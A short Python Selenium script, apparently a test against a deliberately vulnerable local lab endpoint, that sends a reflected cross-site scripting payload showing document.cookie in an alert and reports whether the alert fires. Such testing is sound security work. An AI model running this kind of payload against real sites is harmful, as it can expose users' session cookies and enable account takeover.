from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service 
from webdriver_manager.chrome import ChromeDriverManager
import urllib.parse
import time

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-gpu")

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

target_url = "http://127.0.0.1:8080/vuln/xss/echo"
payload = "<script>alert(document.cookie);</script>"

encoded_payload = urllib.parse.quote(payload)
url_with_params = f"{target_url}?input={encoded_payload}"

driver.get(url_with_params)

time.sleep(2)

try:
    alert = driver.switch_to.alert
    alert_text = alert.text
    print(alert_text)
    alert.accept()

except Exception as e:
    print("XSS failed:", e)

driver.quit()